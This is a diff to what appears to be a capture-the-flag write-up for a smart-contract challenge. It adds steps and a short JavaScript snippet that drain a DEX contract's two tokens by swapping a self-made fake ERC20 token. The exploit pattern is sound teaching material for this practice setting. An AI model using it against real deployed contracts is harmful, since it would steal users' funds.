@@ -20,3 +20,15 @@
 
 ## Detailed Steps
 
+1. First we create our own fake ERC20 token with ourselves having a balance of at least 400.
+2. We send 100 fake tokens to the target contract and approve the rest of the tokens to it.
+
+```js
+// after the above steps...
+fakeToken = "0x...";
+token1 = await contract.token1();
+token2 = await contract.token2();
+
+await contract.swap(fakeToken, token1, 100);
+await contract.swap(fakeToken, token2, 200);
+```
